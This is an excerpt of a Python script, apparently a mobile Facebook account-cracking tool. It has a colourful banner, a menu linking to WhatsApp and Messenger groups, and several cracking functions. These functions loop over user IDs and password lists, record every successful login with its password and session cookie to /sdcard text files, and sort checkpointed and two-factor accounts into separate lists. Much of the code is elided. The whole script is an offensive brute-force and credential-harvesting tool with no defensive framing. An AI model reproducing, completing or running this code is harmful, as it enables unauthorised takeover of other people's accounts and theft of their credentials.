...
def arfan1():
        ...
        return ua
#-----------------------------------------------------#
#os.system("xdg-open https://chat.whatsapp.com/CKXzFekizOCHVTJhgEmgn7")
...
██    ██ ████████ 
 ██  ██     ██    
  ████      ██    
   ...
   ██       ██
\33[1;92m─────────────────────────────────────────────
\33[1;92m DEVELOPER    \33[1;91m ◉     \x1b[38;5;48mYosiF OFFiciaL 	  
\33[1;92m FACEBOOK \33[1;91m     ◉     \x1b[38;5;208mYT Hoon Yar	 	
\33[1;92m GITHUB     \33[1;91m   ◉    \x1b[38;5;47mYosikhan1	\33[1;91m[\33[1;95mYT\33[1;91m]
\33[1;92m─────────────────────────────────────────────
...
def menu_a():
			...
			print(f"\x1b[1;92m {XX}[\x1b[1;92m3{XX}]\x1b[38;5;48m JOIN WHATSAPP GROUP ")
			print(f'\x1b[1;92m {XX}[\x1b[1;92m0{XX}]\x1b[1;91m EXIT MENU ')
			linex()
			xd=input(f'\x1b[1;92m {XX}[\x1b[1;92m●{XX}]\x1b[38;5;46m CHOICE MENU : ')
			if xd in ['1','01']:
				clear()
				print(f'\x1b[1;92m {XX}[\x1b[1;92m●{XX}]\x1b[38;5;46m FILE NAME : /sdcard/YT.txt  etc..')
				linex()
				...
				RANDOM()
			elif xd in ['3','03']:os.system('xdg-open https://m.me/j/AbYhIEpVI9JmQeux/')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write(f'\r {bYT}[{G}YT-M2{bYT}]-[{G}%s{bYT}]-[{G}OK:%s{bYT}]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r {bYT}[{G}LIVE-OK{bYT}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                                        open('/sdcard/YT-FILE-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;36m[YT-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;30m[YT-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/YT-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/YT-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api1(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write(f'\r {bYT}[{G}YT-M1{bYT}]-[{G}%s{bYT}]-[{G}OK:%s{bYT}]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def FIRE(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mYT-M1\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {bYT}[{G}LIVE-OK{bYT}]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                print(f'\r\r {bYT}[{G}•{bYT}]{G} '+kuki+'')
                linex()
                open('/sdcard/YT-RANDOM-M1-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
...
def FIREX(ids,pwv,tl):
    global loop,oks,cps,twf
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mYT-M2\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {bYT}[{G}•{bYT}]{G} '+kuki+'')
                linex()
                open('/sdcard/YT-RANDOM-M2-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
...
def M3Z(ids,pwv,tl):
    global loop,oks,cps,twf
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mYT-M3\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {bYT}[{G}•{bYT}]{G} '+kuki+'')
                linex()
                open('/sdcard/YT-RANDOM-M3-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
